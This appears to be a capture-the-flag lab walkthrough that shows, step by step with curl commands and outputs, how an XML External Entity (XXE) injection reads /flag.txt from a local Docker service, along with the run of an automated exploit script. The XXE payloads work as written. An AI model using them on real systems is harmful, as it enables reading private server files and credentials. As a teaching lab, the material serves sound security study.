# Walkthrough: XXE Injection

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8084/
```

Output:
```json
{
  "service": "Document Processor v1.0",
  "endpoint": "POST /upload  (application/xml)",
  "example": "<data><item>hello</item></data>"
}
```

## Step 1: Normal XML Upload

```bash
curl -s -X POST http://localhost:8084/upload \
  -H "Content-Type: application/xml" \
  -d '<data><item>hello world</item></data>'
```

Output:
```json
{"parsed": true, "items": ["hello world"]}
```

## Step 2: Confirm Entity Expansion

```bash
curl -s -X POST http://localhost:8084/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY x "EXPANDED">]><data><item>&x;</item></data>'
```

Output:
```json
{"parsed": true, "items": ["EXPANDED"]}
```

The parser expands entity references. External entities with `SYSTEM` will read files.

## Step 3: Read /flag.txt via XXE

```bash
curl -s -X POST http://localhost:8084/upload \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY flag SYSTEM "file:///flag.txt">]><data><item>&flag;</item></data>'
```

Output:
```json
{
  "parsed": true,
  "items": ["POC{...}\n"]
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8084
```

Output:
```
[*] Target: http://localhost:8084
[*] Clean XML parsed items: ['hello world']

[*] Sending XXE payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY flag SYSTEM "file:///flag.txt">
]>
<data><item>&flag;</item></data>

[*] Response items: ['POC{...}\n']

[+] Flag: POC{...}
```
